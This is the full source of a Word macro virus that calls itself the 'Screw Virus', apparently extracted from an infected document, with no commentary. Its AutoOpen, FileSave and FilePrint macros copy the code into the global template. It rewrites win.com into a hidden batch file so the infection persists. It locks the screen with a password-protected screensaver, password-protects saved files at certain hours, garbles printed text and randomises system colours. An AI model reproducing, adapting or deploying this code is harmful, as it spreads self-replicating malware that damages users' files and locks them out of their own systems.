   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "FileTemplates"

   Public Sub MAIN()
   Dim plat$
   Dim i#
   Dim y$
   Dim exist
   Dim x$
   Dim z$
   Dim sMe$
   Dim sMacro$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo done
   plat$ = WordBasic.[AppInfo$](1)
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   On Error GoTo -1: On Error GoTo infect
   i# = 1
   y$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.ChDir y$
   Open "win.bat" For Input As 1 exist,
   Close 1
   GoTo done
   infect:
   On Error GoTo -1: On Error GoTo done
   x$ = WordBasic.[DefaultDir$](9) + "\template\normal.dot"
   WordBasic.Rename y$ + "\win.com", y$ + "\vwin.com"
   SetAttr y$ + "\vwin.com", 2
   Open "win.bat" For Output As 1
   Print #1, "@Echo off"
   Print #1, "del " + x$
   Print #1, "attrib -h " + y$ + "\normal.dot>nul"
   Print #1, "copy " + y$ + "\normal.dot " + x$ + ">nul"
   Print #1, "attrib +h " + y$ + "\normal.dot>nul"
   Print #1, "vwin.com"
   Close 1
   SetAttr y$ + "\win.bat", 2
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", y$ + "\system.ini"
   z$ = y$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   done:
   On Error GoTo -1: On Error GoTo Abort
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
   WordBasic.MacroCopy sMacro$, "Global:FileSave", 1
   WordBasic.MacroCopy sMacro$, "Global:FSA", 1
   sMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", 1
   WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize", 1
   WordBasic.MacroCopy sMacro$, "Global:FileTemplates", 1
   WordBasic.MacroCopy sMacro$, "Global:TMC", 1
   sMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy sMacro$, "Global:FilePrint", 1
   WordBasic.MacroCopy sMacro$, "Global:FP", 1
   sMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy sMacro$, "Global:HELP", 1
   WordBasic.MacroCopy sMacro$, "Global:HLP", 1
   sMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy sMacro$, "Global:ABC", 1
   sMacro$ = sMe$ + ":AE"
   WordBasic.MacroCopy sMacro$, "Global:AO", 1
   sMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy sMacro$, "Global:SCR", 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=65, Category:=2, Name:="ABC", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="SCR", Add:=1, Context:=1
   WordBasic.FileSummaryInfo Subject:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Author:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Comments:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Title:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Keywords:="WORD IS SCREWED!!!"
   WordBasic.ToolsOptionsUserInfo Name:="Word is Screwed", Initials:="Screw", Address:="Screw@Screw.com"
   WordBasic.DisableAutoMacros 0
   WordBasic.SaveTemplate
   If i# = 1 Then
   WordBasic.CopyFile FileName:=x$, Directory:=y$
   SetAttr y$ + "\normal.dot", 2
   End If
   Abort:
   End Sub

   Attribute VB_Name = "ToolsMacro"

   Public Sub MAIN()
   Dim plat$
   Dim i#
   Dim y$
   Dim exist
   Dim x$
   Dim z$
   Dim sMe$
   Dim sMacro$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo done
   plat$ = WordBasic.[AppInfo$](1)
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   On Error GoTo -1: On Error GoTo infect
   i# = 1
   y$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.ChDir y$
   Open "win.bat" For Input As 1 exist,
   Close 1
   GoTo done
   infect:
   On Error GoTo -1: On Error GoTo done
   x$ = WordBasic.[DefaultDir$](9) + "\template\normal.dot"
   WordBasic.Rename y$ + "\win.com", y$ + "\vwin.com"
   SetAttr y$ + "\vwin.com", 2
   Open "win.bat" For Output As 1
   Print #1, "@Echo off"
   Print #1, "del " + x$
   Print #1, "attrib -h " + y$ + "\normal.dot>nul"
   Print #1, "copy " + y$ + "\normal.dot " + x$ + ">nul"
   Print #1, "attrib +h " + y$ + "\normal.dot>nul"
   Print #1, "vwin.com"
   Close 1
   SetAttr y$ + "\win.bat", 2
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", y$ + "\system.ini"
   z$ = y$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   done:
   On Error GoTo -1: On Error GoTo Abort
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
   WordBasic.MacroCopy sMacro$, "Global:FileSave", 1
   WordBasic.MacroCopy sMacro$, "Global:FSA", 1
   sMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", 1
   WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize", 1
   WordBasic.MacroCopy sMacro$, "Global:FileTemplates", 1
   WordBasic.MacroCopy sMacro$, "Global:TMC", 1
   sMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy sMacro$, "Global:FilePrint", 1
   WordBasic.MacroCopy sMacro$, "Global:FP", 1
   sMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy sMacro$, "Global:HELP", 1
   WordBasic.MacroCopy sMacro$, "Global:HLP", 1
   sMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy sMacro$, "Global:ABC", 1
   sMacro$ = sMe$ + ":AE"
   WordBasic.MacroCopy sMacro$, "Global:AO", 1
   sMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy sMacro$, "Global:SCR", 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=65, Category:=2, Name:="ABC", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="SCR", Add:=1, Context:=1
   WordBasic.FileSummaryInfo Subject:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Author:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Comments:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Title:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Keywords:="WORD IS SCREWED!!!"
   WordBasic.ToolsOptionsUserInfo Name:="Word is Screwed", Initials:="Screw", Address:="Screw@Screw.com"
   WordBasic.DisableAutoMacros 0
   WordBasic.SaveTemplate
   If i# = 1 Then
   WordBasic.CopyFile FileName:=x$, Directory:=y$
   SetAttr y$ + "\normal.dot", 2
   End If
   Abort:
   End Sub

   Attribute VB_Name = "FileOpen"

   Public Sub MAIN()
   Dim plat$
   Dim i#
   Dim y$
   Dim exist
   Dim x$
   Dim z$
   Dim sMe$
   Dim sMacro$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo done
   plat$ = WordBasic.[AppInfo$](1)
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   On Error GoTo -1: On Error GoTo infect
   i# = 1
   y$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.ChDir y$
   Open "win.bat" For Input As 1 exist,
   Close 1
   GoTo done
   infect:
   On Error GoTo -1: On Error GoTo done
   x$ = WordBasic.[DefaultDir$](9) + "\template\normal.dot"
   WordBasic.Rename y$ + "\win.com", y$ + "\vwin.com"
   SetAttr y$ + "\vwin.com", 2
   Open "win.bat" For Output As 1
   Print #1, "@Echo off"
   Print #1, "del " + x$
   Print #1, "attrib -h " + y$ + "\normal.dot>nul"
   Print #1, "copy " + y$ + "\normal.dot " + x$ + ">nul"
   Print #1, "attrib +h " + y$ + "\normal.dot>nul"
   Print #1, "vwin.com"
   Close 1
   SetAttr y$ + "\win.bat", 2
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", y$ + "\system.ini"
   z$ = y$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   done:
   On Error GoTo -1: On Error GoTo Abort
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
   WordBasic.MacroCopy sMacro$, "Global:FileSave", 1
   WordBasic.MacroCopy sMacro$, "Global:FSA", 1
   sMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", 1
   WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize", 1
   WordBasic.MacroCopy sMacro$, "Global:FileTemplates", 1
   WordBasic.MacroCopy sMacro$, "Global:TMC", 1
   sMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy sMacro$, "Global:FilePrint", 1
   WordBasic.MacroCopy sMacro$, "Global:FP", 1
   sMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy sMacro$, "Global:HELP", 1
   WordBasic.MacroCopy sMacro$, "Global:HLP", 1
   sMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy sMacro$, "Global:ABC", 1
   sMacro$ = sMe$ + ":AE"
   WordBasic.MacroCopy sMacro$, "Global:AO", 1
   sMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy sMacro$, "Global:SCR", 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=65, Category:=2, Name:="ABC", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="SCR", Add:=1, Context:=1
   WordBasic.FileSummaryInfo Subject:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Author:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Comments:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Title:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Keywords:="WORD IS SCREWED!!!"
   WordBasic.ToolsOptionsUserInfo Name:="Word is Screwed", Initials:="Screw", Address:="Screw@Screw.com"
   WordBasic.DisableAutoMacros 0
   WordBasic.SaveTemplate
   If i# = 1 Then
   WordBasic.CopyFile FileName:=x$, Directory:=y$
   SetAttr y$ + "\normal.dot", 2
   End If
   Abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim plat$
   Dim i#
   Dim y$
   Dim exist
   Dim x$
   Dim z$
   Dim sMe$
   Dim sMacro$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo done
   plat$ = WordBasic.[AppInfo$](1)
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   On Error GoTo -1: On Error GoTo infect
   i# = 1
   y$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.ChDir y$
   Open "win.bat" For Input As 1 exist,
   Close 1
   GoTo done
   infect:
   On Error GoTo -1: On Error GoTo done
   x$ = WordBasic.[DefaultDir$](9) + "\template\normal.dot"
   WordBasic.Rename y$ + "\win.com", y$ + "\vwin.com"
   SetAttr y$ + "\vwin.com", 2
   Open "win.bat" For Output As 1
   Print #1, "@Echo off"
   Print #1, "del " + x$
   Print #1, "attrib -h " + y$ + "\normal.dot>nul"
   Print #1, "copy " + y$ + "\normal.dot " + x$ + ">nul"
   Print #1, "attrib +h " + y$ + "\normal.dot>nul"
   Print #1, "vwin.com"
   Close 1
   SetAttr y$ + "\win.bat", 2
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", y$ + "\system.ini"
   z$ = y$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   done:
   On Error GoTo -1: On Error GoTo Abort
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
   WordBasic.MacroCopy sMacro$, "Global:FileSave", 1
   WordBasic.MacroCopy sMacro$, "Global:FSA", 1
   sMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", 1
   WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize", 1
   WordBasic.MacroCopy sMacro$, "Global:FileTemplates", 1
   WordBasic.MacroCopy sMacro$, "Global:TMC", 1
   sMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy sMacro$, "Global:FilePrint", 1
   WordBasic.MacroCopy sMacro$, "Global:FP", 1
   sMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy sMacro$, "Global:HELP", 1
   WordBasic.MacroCopy sMacro$, "Global:HLP", 1
   sMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy sMacro$, "Global:ABC", 1
   sMacro$ = sMe$ + ":AE"
   WordBasic.MacroCopy sMacro$, "Global:AO", 1
   sMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy sMacro$, "Global:SCR", 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=65, Category:=2, Name:="ABC", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="SCR", Add:=1, Context:=1
   WordBasic.FileSummaryInfo Subject:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Author:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Comments:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Title:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Keywords:="WORD IS SCREWED!!!"
   WordBasic.ToolsOptionsUserInfo Name:="Word is Screwed", Initials:="Screw", Address:="Screw@Screw.com"
   WordBasic.DisableAutoMacros 0
   WordBasic.SaveTemplate
   If i# = 1 Then
   WordBasic.CopyFile FileName:=x$, Directory:=y$
   SetAttr y$ + "\normal.dot", 2
   End If
   Abort:
   End Sub

   Attribute VB_Name = "TMC"

   Public Sub MAIN()
   WordBasic.DisableInput
   Error 102
   End Sub

   Attribute VB_Name = "SCR"

   Public Sub MAIN()
   WordBasic.DisableInput
   WordBasic.Insert " "
   WordBasic.Bold = 1
   WordBasic.FontSize 36
   End Sub

   Attribute VB_Name = "HLP"

   Public Sub MAIN()
   Dim i
   WordBasic.DisableInput
   Color__$(0) = "Background"
   Color__$(1) = "AppWorkspace"
   Color__$(2) = "Window"
   Color__$(3) = "WindowText"
   Color__$(4) = "Menu"
   Color__$(5) = "MenuText"
   Color__$(6) = "ActiveTitle"
   Color__$(7) = "InactiveTitle"
   Color__$(8) = "TitleText"
   Color__$(9) = "ActiveBorder"
   Color__$(10) = "InactiveBorder"
   Color__$(11) = "WindowFrame"
   Color__$(12) = "Scrollbar"
   Color__$(13) = "ButtonFace"
   Color__$(14) = "ButtonShadow"
   Color__$(15) = "ButtonText"
   Color__$(16) = "GrayText"
   Color__$(17) = "Hilight"
   Color__$(18) = "HilightText"
   Color__$(19) = "InactiveTitleText"
   Color__$(20) = "ButtonHilight"
   For i = 0 To 20
   WordBasic.SetProfileString "Colors", Color__$(i), Str(WordBasic.Int(Rnd() * 256)) + " " + Str(WordBasic.Int(Rnd() * 256)) + " " + Str(WordBasic.Int(Rnd() * 256))
   Next i
   WordBasic.FileExit 2
   End Sub

   Attribute VB_Name = "FSA"

   Public Sub MAIN()
   Dim sMe$
   Dim sTMacro$
   On Error GoTo -1: On Error GoTo Bail
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg
   WordBasic.Dialog.FileSaveAs dlg
   WordBasic.DisableInput
   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()
   sTMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AO", sTMacro$, 1
   sTMacro$ = sMe$ + ":AO"
   WordBasic.MacroCopy "Global:AO", sTMacro$, 1
   sTMacro$ = sMe$ + ":ToolsMacro"
   WordBasic.MacroCopy "Global:AO", sTMacro$, 1
   sTMacro$ = sMe$ + ":FileTemplates"
   WordBasic.MacroCopy "Global:AO", sTMacro$, 1
   sTMacro$ = sMe$ + ":FileOpen"
   WordBasic.MacroCopy "Global:AO", sTMacro$, 1
   sTMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy "Global:ABC", sTMacro$, 1
   sTMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy "Global:TMC", sTMacro$, 1
   sTMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy "Global:FSA", sTMacro$, 1
   sTMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy "Global:SCR", sTMacro$, 1
   sTMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy "Global:FP", sTMacro$, 1
   sTMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy "Global:HLP", sTMacro$, 1
   If WordBasic.Hour(WordBasic.Now()) = 16 Or WordBasic.Hour(WordBasic.Now()) = 17 Then dlg.Password = "screw virus"
   WordBasic.FileSaveAs dlg  'save the file
   GoTo done
   Bail:
   If Err.Number <> 102 Then
   End If
   done:
   End Sub

   Attribute VB_Name = "ABC"

   Public Sub MAIN()
   WordBasic.DisableInput
   WordBasic.Insert " ABCDEFGHIJKLMNOPQRSTUVWXYZ "
   End Sub

   Attribute VB_Name = "FP"

   Public Sub MAIN()
   Dim i#
   Dim plat$
   Dim z$
   Dim y$
   On Error GoTo -1: On Error GoTo finish
   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
   WordBasic.CurValues.FilePrint dlg
   WordBasic.Dialog.FilePrint dlg
   WordBasic.DisableInput
   WordBasic.ScreenUpdating 0
   WordBasic.EditBookmark Name:="screw", Add:=1
   WordBasic.EditReplace Find:=" a ", Replace:=" e ", ReplaceAll:=1, MatchCase:=1, Wrap:=1
   WordBasic.EditReplace Find:=" I ", Replace:=" Me ", ReplaceAll:=1, MatchCase:=1, Wrap:=1
   WordBasic.EditReplace Find:=". ", Replace:=" !!! ", ReplaceAll:=1, Wrap:=1
   If WordBasic.Hour(WordBasic.Now()) = 15 And WordBasic.Minute(WordBasic.Now()) = 55 And WordBasic.Second(WordBasic.Now()) > 55 Then
   i# = 1
   WordBasic.EndOfDocument
   WordBasic.FontSize 36
   WordBasic.Bold
   WordBasic.Insert Chr(13) + Chr(13) + "SCREW VIRUS IS HERE"
   End If
   WordBasic.StartOfDocument
   WordBasic.FilePrint dlg
   finish:
   WordBasic.EditReplace Find:=" e ", Replace:=" a ", ReplaceAll:=1, MatchCase:=1, Wrap:=1
   WordBasic.EditReplace Find:=" Me ", Replace:=" I ", ReplaceAll:=1, MatchCase:=1, Wrap:=1
   WordBasic.EditReplace Find:=" !!! ", Replace:=". ", ReplaceAll:=1, Wrap:=1
   If i# = 1 Then WordBasic.EditReplace Find:="^p^pSCREW VIRUS IS HERE", Replace:="", ReplaceAll:=1, MatchCase:=1, Wrap:=1
   WordBasic.EditBookmark Name:="screw", Delete:=1, GoTo:=1
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   z$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", z$ + "\system.ini"
   z$ = z$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   WordBasic.ScreenUpdating 1
   End Sub

   Attribute VB_Name = "AO"

   Public Sub MAIN()
   Dim plat$
   Dim i#
   Dim y$
   Dim exist
   Dim x$
   Dim z$
   Dim sMe$
   Dim sMacro$
   WordBasic.DisableInput
   On Error GoTo -1: On Error GoTo done
   plat$ = WordBasic.[AppInfo$](1)
   If WordBasic.[Left$](plat$, 11) = "Windows 3.9" Then
   On Error GoTo -1: On Error GoTo infect
   i# = 1
   y$ = WordBasic.[GetPrivateProfileString$]("Paths", "WinDir", "c:\msdos.sys")
   WordBasic.ChDir y$
   Open "win.bat" For Input As 1 exist,
   Close 1
   GoTo done
   infect:
   On Error GoTo -1: On Error GoTo done
   x$ = WordBasic.[DefaultDir$](9) + "\template\normal.dot"
   WordBasic.Rename y$ + "\win.com", y$ + "\vwin.com"
   SetAttr y$ + "\vwin.com", 2
   Open "win.bat" For Output As 1
   Print #1, "@Echo off"
   Print #1, "del " + x$
   Print #1, "attrib -h " + y$ + "\normal.dot>nul"
   Print #1, "copy " + y$ + "\normal.dot " + x$ + ">nul"
   Print #1, "attrib +h " + y$ + "\normal.dot>nul"
   Print #1, "vwin.com"
   Close 1
   SetAttr y$ + "\win.bat", 2
   WordBasic.SetPrivateProfileString "boot", "SCRNSAVE.EXE", UCase(y$) + "\SSMARQUE.SCR", y$ + "\system.ini"
   z$ = y$ + "\Control.ini"
   WordBasic.SetPrivateProfileString "ScreenSaver", "Password", "y}L'/WVIt&s", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "PWProtected", "1", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text", "You Are Infected With The Screw Virus!!!", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Font", "System", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Size", "50", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "BackgroundColor", "0 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Text Color", "255 0 0", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Speed", "10", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "Attributes", "00011", z$
   WordBasic.SetPrivateProfileString "Screen Saver.Marquee", "CharSet", "0", z$
   End If
   done:
   On Error GoTo -1: On Error GoTo Abort
   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":FSA"
   WordBasic.MacroCopy sMacro$, "Global:FileSaveAs", 1
   WordBasic.MacroCopy sMacro$, "Global:FileSave", 1
   WordBasic.MacroCopy sMacro$, "Global:FSA", 1
   sMacro$ = sMe$ + ":TMC"
   WordBasic.MacroCopy sMacro$, "Global:ToolsMacro", 1
   WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize", 1
   WordBasic.MacroCopy sMacro$, "Global:FileTemplates", 1
   WordBasic.MacroCopy sMacro$, "Global:TMC", 1
   sMacro$ = sMe$ + ":FP"
   WordBasic.MacroCopy sMacro$, "Global:FilePrint", 1
   WordBasic.MacroCopy sMacro$, "Global:FP", 1
   sMacro$ = sMe$ + ":HLP"
   WordBasic.MacroCopy sMacro$, "Global:HELP", 1
   WordBasic.MacroCopy sMacro$, "Global:HLP", 1
   sMacro$ = sMe$ + ":ABC"
   WordBasic.MacroCopy sMacro$, "Global:ABC", 1
   sMacro$ = sMe$ + ":AE"
   WordBasic.MacroCopy sMacro$, "Global:AO", 1
   sMacro$ = sMe$ + ":SCR"
   WordBasic.MacroCopy sMacro$, "Global:SCR", 1
   WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
   WordBasic.ToolsCustomizeKeyboard KeyCode:=65, Category:=2, Name:="ABC", Add:=1, Context:=1
   WordBasic.ToolsCustomizeKeyboard KeyCode:=32, Category:=2, Name:="SCR", Add:=1, Context:=1
   WordBasic.FileSummaryInfo Subject:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Author:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Comments:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Title:="WORD IS SCREWED!!!"
   WordBasic.FileSummaryInfo Keywords:="WORD IS SCREWED!!!"
   WordBasic.ToolsOptionsUserInfo Name:="Word is Screwed", Initials:="Screw", Address:="Screw@Screw.com"
   WordBasic.DisableAutoMacros 0
   WordBasic.SaveTemplate
   If i# = 1 Then
   WordBasic.CopyFile FileName:=x$, Directory:=y$
   SetAttr y$ + "\normal.dot", 2
   End If
   Abort:
   End Sub
